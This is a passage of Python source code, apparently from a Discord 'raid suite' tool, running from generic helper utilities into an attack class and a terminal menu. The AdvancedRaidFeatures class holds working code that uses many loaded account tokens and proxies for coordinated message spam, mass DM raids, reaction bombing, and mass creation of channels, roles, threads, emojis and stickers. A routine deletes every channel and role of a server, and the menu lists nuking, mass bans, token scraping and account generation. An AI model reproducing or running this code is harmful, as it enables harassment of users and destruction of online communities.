    # ═══ DISCORD API HELPERS ═══
    
    @staticmethod
    def get_user_info(token, user_id):
        """Get detailed user information"""
        try:
            headers = {"Authorization": token}
            res = requests.get(f"https://discord.com/api/v9/users/{user_id}", headers=headers)
            if res.status_code == 200:
                return res.json()
            return None
        except:
            return None
    
    @staticmethod
    def get_guild_preview(invite_code):
        """Get guild preview from invite code"""
        try:
            res = requests.get(f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true&with_expiration=true")
            if res.status_code == 200:
                return res.json()
            return None
        except:
            return None
    
    @staticmethod
    def search_messages(token, channel_id, query, limit=25):
        """Search messages in a channel"""
        try:
            headers = {"Authorization": token}
            res = requests.get(
                f"https://discord.com/api/v9/channels/{channel_id}/messages/search?content={query}&limit={limit}",
                headers=headers
            )
            if res.status_code == 200:
                return res.json()
            return None
        except:
            return None
    
    @staticmethod
    def get_message_reactions(token, channel_id, message_id, emoji):
        """Get users who reacted with specific emoji"""
        try:
            headers = {"Authorization": token}
            res = requests.get(
                f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}",
                headers=headers
            )
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    @staticmethod
    def create_dm_channel(token, user_id):
        """Create DM channel with user"""
        try:
            headers = {"Authorization": token}
            payload = {"recipients": [user_id]}
            res = requests.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=headers,
                json=payload
            )
            if res.status_code == 200:
                return res.json()
            return None
        except:
            return None
    
    @staticmethod
    def get_guild_integrations(token, guild_id):
        """Get guild integrations"""
        try:
            headers = {"Authorization": token}
            res = requests.get(
                f"https://discord.com/api/v9/guilds/{guild_id}/integrations",
                headers=headers
            )
            if res.status_code == 200:
                return res.json()
            return []
        except:
            return []
    
    @staticmethod
    def get_guild_vanity_url(token, guild_id):
        """Get guild vanity URL"""
        try:
            headers = {"Authorization": token}
            res = requests.get(
                f"https://discord.com/api/v9/guilds/{guild_id}/vanity-url",
                headers=headers
            )
            if res.status_code == 200:
                return res.json()
            return None
        except:
            return None
    
    # ═══ DATA PROCESSING ═══
    
    @staticmethod
    def filter_valid_tokens(tokens):
        """Filter and return only valid tokens"""
        valid = []
        for token in tokens:
            if SecurityUtilities.validate_token_format(token):
                valid.append(token)
        return valid
    
    @staticmethod
    def deduplicate_list(items):
        """Remove duplicates while preserving order"""
        seen = set()
        result = []
        for item in items:
            if item not in seen:
                seen.add(item)
                result.append(item)
        return result
    
    @staticmethod
    def merge_dictionaries(*dicts):
        """Merge multiple dictionaries"""
        result = {}
        for d in dicts:
            result.update(d)
        return result
    
    @staticmethod
    def flatten_list(nested_list):
        """Flatten nested list"""
        result = []
        for item in nested_list:
            if isinstance(item, list):
                result.extend(ComprehensiveUtilities.flatten_list(item))
            else:
                result.append(item)
        return result
    
    @staticmethod
    def group_by_key(items, key_func):
        """Group items by key function"""
        groups = {}
        for item in items:
            key = key_func(item)
            if key not in groups:
                groups[key] = []
            groups[key].append(item)
        return groups
    
    # ═══ NETWORK UTILITIES ═══
    
    @staticmethod
    def test_connection(url="https://discord.com", timeout=5):
        """Test internet connection"""
        try:
            res = requests.get(url, timeout=timeout)
            return res.status_code == 200
        except:
            return False
    
    @staticmethod
    def get_public_ip():
        """Get public IP address"""
        try:
            res = requests.get("https://api.ipify.org?format=json", timeout=5)
            if res.status_code == 200:
                return res.json().get("ip")
            return None
        except:
            return None
    
    @staticmethod
    def check_port_open(host, port, timeout=3):
        """Check if port is open"""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    @staticmethod
    def resolve_hostname(hostname):
        """Resolve hostname to IP"""
        import socket
        try:
            return socket.gethostbyname(hostname)
        except:
            return None
    
    # ═══ FILE OPERATIONS ═══
    
    @staticmethod
    def read_file_lines(filepath, encoding='utf-8'):
        """Read file and return lines"""
        try:
            with open(filepath, 'r', encoding=encoding) as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []
    
    @staticmethod
    def write_file_lines(filepath, lines, encoding='utf-8'):
        """Write lines to file"""
        try:
            with open(filepath, 'w', encoding=encoding) as f:
                f.write('\n'.join(lines))
            return True
        except:
            return False
    
    @staticmethod
    def append_to_file(filepath, content, encoding='utf-8'):
        """Append content to file"""
        try:
            with open(filepath, 'a', encoding=encoding) as f:
                f.write(content + '\n')
            return True
        except:
            return False
    
    @staticmethod
    def file_exists(filepath):
        """Check if file exists"""
        return os.path.exists(filepath) and os.path.isfile(filepath)
    
    @staticmethod
    def directory_exists(dirpath):
        """Check if directory exists"""
        return os.path.exists(dirpath) and os.path.isdir(dirpath)
    
    @staticmethod
    def create_directory(dirpath):
        """Create directory if it doesn't exist"""
        try:
            os.makedirs(dirpath, exist_ok=True)
            return True
        except:
            return False
    
    @staticmethod
    def get_file_size(filepath):
        """Get file size in bytes"""
        try:
            return os.path.getsize(filepath)
        except:
            return 0
    
    @staticmethod
    def get_file_modified_time(filepath):
        """Get file last modified time"""
        try:
            return os.path.getmtime(filepath)
        except:
            return None
    
    # ═══ STRING MANIPULATION ═══
    
    @staticmethod
    def truncate_string(text, max_length=100, suffix="..."):
        """Truncate string to max length"""
        if len(text) <= max_length:
            return text
        return text[:max_length - len(suffix)] + suffix
    
    @staticmethod
    def remove_whitespace(text):
        """Remove all whitespace from text"""
        return ''.join(text.split())
    
    @staticmethod
    def capitalize_words(text):
        """Capitalize first letter of each word"""
        return ' '.join(word.capitalize() for word in text.split())
    
    @staticmethod
    def reverse_string(text):
        """Reverse a string"""
        return text[::-1]
    
    @staticmethod
    def count_words(text):
        """Count words in text"""
        return len(text.split())
    
    @staticmethod
    def extract_urls(text):
        """Extract URLs from text"""
        url_pattern = r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
        return re.findall(url_pattern, text)
    
    @staticmethod
    def extract_emails(text):
        """Extract email addresses from text"""
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        return re.findall(email_pattern, text)
    
    @staticmethod
    def replace_multiple(text, replacements):
        """Replace multiple strings"""
        for old, new in replacements.items():
            text = text.replace(old, new)
        return text
    
    # ═══ TIME UTILITIES ═══
    
    @staticmethod
    def get_timestamp():
        """Get current Unix timestamp"""
        return int(time.time())
    
    @staticmethod
    def timestamp_to_datetime(timestamp):
        """Convert timestamp to datetime string"""
        return datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def get_time_difference(timestamp1, timestamp2):
        """Get time difference in seconds"""
        return abs(timestamp1 - timestamp2)
    
    @staticmethod
    def is_recent(timestamp, max_age_seconds=3600):
        """Check if timestamp is recent"""
        return time.time() - timestamp < max_age_seconds
    
    # ═══ RANDOM UTILITIES ═══
    
    @staticmethod
    def generate_random_string(length=10, chars=None):
        """Generate random string"""
        if not chars:
            chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def generate_random_number(min_val=0, max_val=100):
        """Generate random number"""
        return random.randint(min_val, max_val)
    
    @staticmethod
    def shuffle_list(items):
        """Shuffle list randomly"""
        shuffled = items.copy()
        random.shuffle(shuffled)
        return shuffled
    
    @staticmethod
    def pick_random(items, count=1):
        """Pick random items from list"""
        if count == 1:
            return random.choice(items)
        return random.sample(items, min(count, len(items)))
    
    # ═══ VALIDATION UTILITIES ═══
    
    @staticmethod
    def is_valid_url(url):
        """Check if URL is valid"""
        url_pattern = r'^https?://(?:www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b(?:[-a-zA-Z0-9()@:%_\+.~#?&/=]*)$'
        return bool(re.match(url_pattern, url))
    
    @staticmethod
    def is_valid_email(email):
        """Check if email is valid"""
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(email_pattern, email))
    
    @staticmethod
    def is_valid_ip(ip):
        """Check if IP address is valid"""
        ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return bool(re.match(ip_pattern, ip))
    
    @staticmethod
    def is_numeric(value):
        """Check if value is numeric"""
        try:
            float(value)
            return True
        except:
            return False
    
    # ═══ CONVERSION UTILITIES ═══
    
    @staticmethod
    def string_to_bool(value):
        """Convert string to boolean"""
        return value.lower() in ['true', '1', 'yes', 'y', 'on']
    
    @staticmethod
    def list_to_string(items, separator=', '):
        """Convert list to string"""
        return separator.join(str(item) for item in items)
    
    @staticmethod
    def string_to_list(text, separator=','):
        """Convert string to list"""
        return [item.strip() for item in text.split(separator) if item.strip()]
    
    @staticmethod
    def dict_to_query_string(params):
        """Convert dictionary to query string"""
        return '&'.join(f"{k}={v}" for k, v in params.items())
    
    # ═══ DISCORD SPECIFIC ═══
    
    @staticmethod
    def format_discord_timestamp(timestamp, style='f'):
        """Format timestamp for Discord"""
        styles = {
            't': 'Short Time',
            'T': 'Long Time',
            'd': 'Short Date',
            'D': 'Long Date',
            'f': 'Short Date/Time',
            'F': 'Long Date/Time',
            'R': 'Relative Time'
        }
        return f"<t:{int(timestamp)}:{style}>"
    
    @staticmethod
    def create_discord_mention(user_id):
        """Create Discord user mention"""
        return f"<@{user_id}>"
    
    @staticmethod
    def create_channel_mention(channel_id):
        """Create Discord channel mention"""
        return f"<#{channel_id}>"
    
    @staticmethod
    def create_role_mention(role_id):
        """Create Discord role mention"""
        return f"<@&{role_id}>"
    
    @staticmethod
    def create_custom_emoji(emoji_name, emoji_id, animated=False):
        """Create custom emoji string"""
        prefix = 'a' if animated else ''
        return f"<{prefix}:{emoji_name}:{emoji_id}>"
    
    @staticmethod
    def parse_discord_timestamp(timestamp_str):
        """Parse Discord timestamp string"""
        match = re.search(r'<t:(\d+):[tTdDfFR]>', timestamp_str)
        if match:
            return int(match.group(1))
        return None
    
    # ═══ MATH UTILITIES ═══
    
    @staticmethod
    def calculate_percentage(part, total):
        """Calculate percentage"""
        if total == 0:
            return 0
        return (part / total) * 100
    
    @staticmethod
    def clamp(value, min_val, max_val):
        """Clamp value between min and max"""
        return max(min_val, min(value, max_val))
    
    @staticmethod
    def average(numbers):
        """Calculate average"""
        if not numbers:
            return 0
        return sum(numbers) / len(numbers)
    
    @staticmethod
    def median(numbers):
        """Calculate median"""
        if not numbers:
            return 0
        sorted_numbers = sorted(numbers)
        n = len(sorted_numbers)
        if n % 2 == 0:
            return (sorted_numbers[n//2 - 1] + sorted_numbers[n//2]) / 2
        return sorted_numbers[n//2]

# ═══════════════════════════════════════════════════════════════════════════════
# ADVANCED RAID FEATURES CLASS - Ultimate Raid Operations
# ═══════════════════════════════════════════════════════════════════════════════

class AdvancedRaidFeatures:
    """Advanced raid features and coordinated attack operations"""
    
    def __init__(self, tokens):
        self.tokens = tokens
    
    def coordinated_spam(self, channel_id, messages, count=10, delay=1):
        """Coordinated spam from multiple tokens"""
        console.log("Started", C["cyan"], "Coordinated Spam", f"{len(self.tokens)} tokens")
        
        sent = 0
        for i in range(count):
            for j, token in enumerate(self.tokens):
                if STRIKE_EVENT.is_set():
                    break
                
                message = random.choice(messages) if isinstance(messages, list) else messages
                try:
                    payload = {"content": message}
                    res = req_session.post(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages",
                        headers={"Authorization": token},
                        json=payload
                    )
                    if res.status_code == 200:
                        sent += 1
                        console.log("Sent", C["green"], f"Token {j+1}", f"#{sent}")
                except Exception as e:
                    console.log("Error", C["red"], f"Token {j+1}", str(e)[:30])
                
                time.sleep(delay)
        
        console.log("Complete", C["cyan"], "Coordinated Spam", f"{sent} messages sent")
        return sent
    
    def mass_channel_create(self, guild_id, channel_name, count=10, channel_type=0):
        """Mass create channels"""
        console.log("Started", C["cyan"], "Mass Channel Create", f"{count} channels")
        
        created = 0
        for i in range(count):
            if STRIKE_EVENT.is_set():
                break
            
            token = random.choice(self.tokens)
            try:
                payload = {
                    "name": f"{channel_name}-{i+1}",
                    "type": channel_type
                }
                res = req_session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                    headers={"Authorization": token},
                    json=payload
                )
                if res.status_code == 201:
                    created += 1
                    console.log("Created", C["green"], f"{channel_name}-{i+1}", f"#{created}")
                
                time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], "Channel Create", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Mass Channel Create", f"{created}/{count} created")
        return created
    
    def mass_role_create(self, guild_id, role_name, count=10):
        """Mass create roles"""
        console.log("Started", C["cyan"], "Mass Role Create", f"{count} roles")
        
        created = 0
        for i in range(count):
            if STRIKE_EVENT.is_set():
                break
            
            token = random.choice(self.tokens)
            try:
                payload = {
                    "name": f"{role_name}-{i+1}",
                    "color": random.randint(0, 16777215)
                }
                res = req_session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/roles",
                    headers={"Authorization": token},
                    json=payload
                )
                if res.status_code == 200:
                    created += 1
                    console.log("Created", C["green"], f"{role_name}-{i+1}", f"#{created}")
                
                time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], "Role Create", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Mass Role Create", f"{created}/{count} created")
        return created
    
    def mass_webhook_spam(self, webhooks, message, count=50):
        """Spam multiple webhooks"""
        console.log("Started", C["cyan"], "Mass Webhook Spam", f"{len(webhooks)} webhooks")
        
        sent = 0
        for i in range(count):
            if STRIKE_EVENT.is_set():
                break
            
            webhook = random.choice(webhooks)
            try:
                payload = {"content": message}
                res = requests.post(webhook, json=payload)
                if res.status_code == 204:
                    sent += 1
                    console.log("Sent", C["green"], "Webhook Message", f"#{sent}")
                
                time.sleep(0.3)
            except Exception as e:
                console.log("Error", C["red"], "Webhook Spam", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Mass Webhook Spam", f"{sent}/{count} sent")
        return sent
    
    def coordinated_reaction_bomb(self, channel_id, message_id, emojis, rounds=5):
        """Coordinated reaction bombing"""
        console.log("Started", C["cyan"], "Coordinated Reaction Bomb", f"{len(self.tokens)} tokens")
        
        added = 0
        for round_num in range(rounds):
            if STRIKE_EVENT.is_set():
                break
            
            for emoji in emojis:
                for token in self.tokens:
                    try:
                        res = req_session.put(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me",
                            headers={"Authorization": token}
                        )
                        if res.status_code == 204:
                            added += 1
                        time.sleep(0.2)
                    except:
                        pass
            
            console.log("Round", C["green"], f"{round_num+1}/{rounds}", f"{added} reactions")
        
        console.log("Complete", C["cyan"], "Reaction Bomb", f"{added} total reactions")
        return added
    
    def mass_dm_raid(self, user_ids, message, delay=2):
        """Mass DM raid to multiple users"""
        console.log("Started", C["cyan"], "Mass DM Raid", f"{len(user_ids)} users")
        
        sent = 0
        for user_id in user_ids:
            if STRIKE_EVENT.is_set():
                break
            
            token = random.choice(self.tokens)
            try:
                # Create DM channel
                dm_payload = {"recipients": [user_id]}
                dm_res = req_session.post(
                    "https://discord.com/api/v9/users/@me/channels",
                    headers={"Authorization": token},
                    json=dm_payload
                )
                
                if dm_res.status_code == 200:
                    dm_channel = dm_res.json()
                    
                    # Send message
                    msg_payload = {"content": message}
                    msg_res = req_session.post(
                        f"https://discord.com/api/v9/channels/{dm_channel['id']}/messages",
                        headers={"Authorization": token},
                        json=msg_payload
                    )
                    
                    if msg_res.status_code == 200:
                        sent += 1
                        console.log("Sent", C["green"], f"DM to {user_id}", f"#{sent}")
                
                time.sleep(delay)
            except Exception as e:
                console.log("Error", C["red"], f"DM to {user_id}", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Mass DM Raid", f"{sent}/{len(user_ids)} sent")
        return sent
    
    def server_destruction(self, guild_id):
        """Complete server destruction"""
        console.log("Started", C["red"], "SERVER DESTRUCTION", guild_id)
        
        stats = {
            "channels_deleted": 0,
            "roles_deleted": 0,
            "members_banned": 0,
            "webhooks_deleted": 0
        }
        
        token = self.tokens[0]
        try:
            res = req_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers={"Authorization": token})
            if res.status_code == 200:
                for channel in res.json():
                    if STRIKE_EVENT.is_set(): break
                    try:
                        del_res = req_session.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers={"Authorization": token})
                        if del_res.status_code == 200:
                            stats["channels_deleted"] += 1
                            console.log("Deleted", C["red"], "Channel", channel.get("name", "Unknown"))
                        time.sleep(0.3)
                    except:
                        pass
        except:
            pass
        
        # Delete all roles
        try:
            res = req_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers={"Authorization": token})
            if res.status_code == 200:
                roles = res.json()
                for role in roles:
                    if role.get("name") != "@everyone":
                        try:
                            del_res = req_session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers={"Authorization": token})
                            if del_res.status_code == 204:
                                stats["roles_deleted"] += 1
                                console.log("Deleted", C["red"], "Role", role.get("name", "Unknown"))
                            time.sleep(0.3)
                        except:
                            pass
        except:
            pass
        
        console.log("COMPLETE", C["red"], "Server Destruction", 
                   f"Channels: {stats['channels_deleted']} | Roles: {stats['roles_deleted']}")
        return stats
    
    def coordinated_join(self, invite_code):
        """Coordinated server join"""
        console.log("Started", C["cyan"], "Coordinated Join", f"{len(self.tokens)} tokens")
        
        joined = 0
        for i, token in enumerate(self.tokens):
            if STRIKE_EVENT.is_set():
                break
            
            try:
                res = req_session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers={"Authorization": token})
                if res.status_code == 200:
                    joined += 1
                    console.log("Joined", C["green"], f"Token {i+1}", f"#{joined}")
                
                time.sleep(1)
            except Exception as e:
                console.log("Error", C["red"], f"Token {i+1}", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Coordinated Join", f"{joined}/{len(self.tokens)} joined")
        return joined
    
    def coordinated_leave(self, guild_id):
        """Coordinated server leave"""
        console.log("Started", C["cyan"], "Coordinated Leave", f"{len(self.tokens)} tokens")
        
        left = 0
        for i, token in enumerate(self.tokens):
            if STRIKE_EVENT.is_set(): break
            try:
                res = req_session.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers={"Authorization": token})
                if res.status_code == 204:
                    left += 1
                    console.log("Left", C["green"], f"Token {i+1}", f"#{left}")
                
                time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], f"Token {i+1}", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Coordinated Leave", f"{left}/{len(self.tokens)} left")
        return left
    
    def mass_nickname_change(self, guild_id, nicknames):
        """Mass nickname changes"""
        console.log("Started", C["cyan"], "Mass Nickname Change", f"{len(self.tokens)} tokens")
        
        changed = 0
        for i, token in enumerate(self.tokens):
            if STRIKE_EVENT.is_set():
                break
            
            nickname = random.choice(nicknames) if isinstance(nicknames, list) else nicknames
            try:
                payload = {"nick": nickname}
                res = req_session.patch(
                    f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
                    headers={"Authorization": token},
                    json=payload
                )
                if res.status_code == 200:
                    changed += 1
                    console.log("Changed", C["green"], f"Token {i+1}", nickname)
                
                time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], f"Token {i+1}", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Mass Nickname Change", f"{changed}/{len(self.tokens)} changed")
        return changed
    
    def voice_channel_raid(self, guild_id, voice_channel_id):
        """Raid voice channel"""
        console.log("Started", C["cyan"], "Voice Channel Raid", f"{len(self.tokens)} tokens")
        
        joined = 0
        for i, token in enumerate(self.tokens):
            if STRIKE_EVENT.is_set():
                break
            
            try:
                payload = {
                    "guild_id": guild_id,
                    "channel_id": voice_channel_id,
                    "self_mute": False,
                    "self_deaf": False
                }
                res = req_session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me",
                    headers={"Authorization": token},
                    json=payload
                )
                if res.status_code == 204:
                    joined += 1
                    console.log("Joined", C["green"], f"Token {i+1}", f"#{joined}")
                
                time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], f"Token {i+1}", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Voice Channel Raid", f"{joined}/{len(self.tokens)} joined")
        return joined
    
    def thread_spam(self, channel_id, thread_name, count=20):
        """Spam threads in channel"""
        console.log("Started", C["cyan"], "Thread Spam", f"{count} threads")
        
        created = 0
        for i in range(count):
            if STRIKE_EVENT.is_set():
                break
            
            token = random.choice(self.tokens)
            try:
                payload = {
                    "name": f"{thread_name}-{i+1}",
                    "type": 11,
                    "auto_archive_duration": 1440
                }
                res = req_session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers={"Authorization": token},
                    json=payload
                )
                if res.status_code == 201:
                    created += 1
                    console.log("Created", C["green"], f"{thread_name}-{i+1}", f"#{created}")
                
                time.sleep(0.5)
            except Exception as e:
                console.log("Error", C["red"], "Thread Create", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Thread Spam", f"{created}/{count} created")
        return created
    
    def emoji_spam(self, guild_id, emoji_name, emoji_url, count=50):
        """Spam custom emojis"""
        console.log("Started", C["cyan"], "Emoji Spam", f"{count} emojis")
        
        created = 0
        for i in range(count):
            if STRIKE_EVENT.is_set():
                break
            
            token = random.choice(self.tokens)
            try:
                # Download emoji image
                img_res = requests.get(emoji_url)
                if img_res.status_code == 200:
                    import base64
                    img_data = base64.b64encode(img_res.content).decode('utf-8')
                    
                    payload = {
                        "name": f"{emoji_name}{i+1}",
                        "image": f"data:image/png;base64,{img_data}"
                    }
                    res = req_session.post(
                        f"https://discord.com/api/v9/guilds/{guild_id}/emojis",
                        headers={"Authorization": token},
                        json=payload
                    )
                    if res.status_code == 201:
                        created += 1
                        console.log("Created", C["green"], f"{emoji_name}{i+1}", f"#{created}")
                
                time.sleep(1)
            except Exception as e:
                console.log("Error", C["red"], "Emoji Create", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Emoji Spam", f"{created}/{count} created")
        return created
    
    def sticker_spam(self, guild_id, sticker_name, sticker_url, count=20):
        """Spam custom stickers"""
        console.log("Started", C["cyan"], "Sticker Spam", f"{count} stickers")
        
        created = 0
        for i in range(count):
            if STRIKE_EVENT.is_set():
                break
            
            token = random.choice(self.tokens)
            try:
                # Download sticker image
                img_res = requests.get(sticker_url)
                if img_res.status_code == 200:
                    import base64
                    img_data = base64.b64encode(img_res.content).decode('utf-8')
                    
                    payload = {
                        "name": f"{sticker_name}{i+1}",
                        "description": f"Sticker {i+1}",
                        "tags": "raid",
                        "file": f"data:image/png;base64,{img_data}"
                    }
                    res = req_session.post(
                        f"https://discord.com/api/v9/guilds/{guild_id}/stickers",
                        headers={"Authorization": token},
                        json=payload
                    )
                    if res.status_code == 200:
                        created += 1
                        console.log("Created", C["green"], f"{sticker_name}{i+1}", f"#{created}")
                
                time.sleep(1)
            except Exception as e:
                console.log("Error", C["red"], "Sticker Create", str(e)[:30])
        
        console.log("Complete", C["cyan"], "Sticker Spam", f"{created}/{count} created")
        return created
    
    def full_raid_sequence(self, guild_id, config):
        """Execute full raid sequence"""
        console.log("STARTED", C["red"], "FULL RAID SEQUENCE", guild_id)
        
        results = {
            "channels_created": 0,
            "roles_created": 0,
            "messages_sent": 0,
            "webhooks_created": 0
        }
        
        # Phase 1: Mass Channel Creation
        if config.get("create_channels"):
            results["channels_created"] = self.mass_channel_create(
                guild_id, 
                config.get("channel_name", "raided"),
                config.get("channel_count", 50)
            )
        
        # Phase 2: Mass Role Creation
        if config.get("create_roles"):
            results["roles_created"] = self.mass_role_create(
                guild_id,
                config.get("role_name", "raided"),
                config.get("role_count", 50)
            )
        
        # Phase 3: Coordinated Spam
        if config.get("spam_messages") and results["channels_created"] > 0:
            # Get created channels
            token = self.tokens[0]
            res = req_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers={"Authorization": token})
            if res.status_code == 200:
                channels = res.json()
                for channel in channels[:10]:  # Spam first 10 channels
                    results["messages_sent"] += self.coordinated_spam(
                        channel["id"],
                        config.get("spam_message", "RAIDED"),
                        config.get("spam_count", 10)
                    )
        
        console.log("COMPLETE", C["red"], "FULL RAID SEQUENCE",
                   f"Channels: {results['channels_created']} | Roles: {results['roles_created']} | Messages: {results['messages_sent']}")
        return results

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION LOADING
# ═══════════════════════════════════════════════════════════════════════════════

# Load config or use defaults
try:
    with open("config.json") as f:
        Config = json.load(f)
    proxy = Config.get("Proxies", False)
    color = Config.get("Theme", "light_blue")
except:
    # Default config if file doesn't exist
    proxy = False
    color = "light_blue"

# ═══════════════════════════════════════════════════════════════════════════════
# RENDER CLASS - Terminal UI and Display
# ═══════════════════════════════════════════════════════════════════════════════

class Render:
    def __init__(self):
        try:
            self.size = os.get_terminal_size().columns
        except (OSError, ValueError):
            self.size = 120  # Default fallback
        self.print_lock = threading.Lock()
        self.background = C[color] if color in C else C["light_blue"]
        threading.Thread(target=self._animate_title, daemon=True).start()

    def _animate_title(self):
        if sys.platform != "win32": return
        import ctypes
        text = "   ASTRO-NEXUS OVERDRIVE - PROFESSIONAL ELITE DISCORD RAID SUITE 2026 - STATUS: ACTIVE   "
        while True:
            for i in range(len(text)):
                display = text[i:] + text[:i]
                ctypes.windll.kernel32.SetConsoleTitleW(f"🌑 {display} 🌑")
                time.sleep(0.12)

    def title(self, title):
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)

    def clear(self):
        os.system("cls" if os.name == "nt" else "clear")
        
    def render_ascii(self):
        self.clear()
        self.title(f"ASTRO-NEXUS | Connected as {os.getlogin()} | Professional Edition")
        
        ascii_art = [
            " █████╗ ███████╗████████╗██████╗  ██████╗     ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗",
            "██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝",
            "███████║███████╗   ██║   ██████╔╝██║   ██║    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗",
            "██╔══██║╚════██║   ██║   ██╔══██╗██║   ██║    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║",
            "██║  ██║███████║   ██║   ██║  ██║╚██████╔╝    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║",
            "╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
        ]

        # Dynamic Rainbow effect using HSL to RGB conversion or simple color cycling
        rainbow_colors = [C["red"], C["orange"], C["yellow"], C["green"], C["blue"], C["magenta"]]
        
        for i, line in enumerate(ascii_art):
            color = rainbow_colors[i % len(rainbow_colors)]
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 120
            print(f"{color}{line.center(cols)}{Fore.RESET}")
        print("".center(cols))

    def raider_options(self):
        with open("data/proxies.txt") as f:
            global proxies
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            global tokens
            raw_tokens = f.read().splitlines()
            tokens = []
            for line in raw_tokens:
                if not line.strip(): continue
                # Extract only the token part (before any | or whitespace metadata)
                token_part = line.split('|')[0].strip() if '|' in line else line.strip()
                # Remove quotes if present
                token_part = token_part.replace('"', '').replace("'", "")
                if token_part: tokens.append(token_part)

        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
        # Hyper-Rainbow Title
        title_text = f"Loaded ‹ {len(tokens)} › tokens | Loaded ‹ {len(proxies)} › proxies"
        padding = (self.size - len(title_text)) // 2
        print(f"{Fore.RESET}{' ' * padding}{C['rose']}{title_text}{Fore.RESET}\n")

        menu = [
            " «01» Joiner        «08» Button Click   «15» Change Nick    «22» Onboarding",
            " «02» Leaver        «09» Accept Rules   «16» Thread Spam    «23» Dm Spammer",
            " «03» Spammer       «10» Guild Check    «17» Typer          «25» Mass Report",
            " «04» Token Checker «11» Friend Spam    «18» Nitro Sniper   «26» HypeSquad",
            " «05» Reaction      «12» Analytics      «19» Call Spammer   «27» Mass Block",
            " «06» Server Nuker  «13» Onliner        «20» Bio Change     «28» Leave All",
            " «07» Formatter     «14» Soundbord      «21» Voice Joiner   «29» Token Scraper",
            " «24» Exit",
            "─────────────────────────────────────────────────────────────────────────────",
            " «30» KABOOM (Nuke) «31» DEL CHANNELS   «32» DEL ROLES      «33» DEL EMOJIS",
            " «34» DEL WEBHOOKS  «35» NEW CHANNELS   «36» NEW ROLES      «37» MASS BAN",
            " «38» MASS KICK     «39» IDENTITY MOD   «40» PRUNE GUILD    «41» AUTO STATUS",
            " «42» GRANT ADMIN   «43» AUDIT FLOOD    «44» WEBHOOK BLAST  «45» PROXY GEN",
            " «46» PROXY CLEAN   «47» FRIEND DM      «48» FRIEND PURGE   «49» SERVER CLONE",
            " «50» RBW CYCLONE   «51» STICKER BOMB   «52» EMAIL GEN      «53» ACCOUNT GEN"
        ]
        

        print(f"{self.background}╭───────────────────────────────────────────────────────────────────────────────╮{Fore.RESET}")
        colors = [C["red"], C["orange"], C["yellow"], C["green"], C["blue"], C["magenta"], C["orchid"]]
        start_idx = int(time.time() * 2) % len(colors)
        for i, line in enumerate(menu):
            color = colors[(i + start_idx) % len(colors)]
            if "──" in line:
                # Synchronize divider length with the 79-width interior
                divider = "─" * 79
                print(f"{self.background}├{divider}┤{Fore.RESET}")
            else:
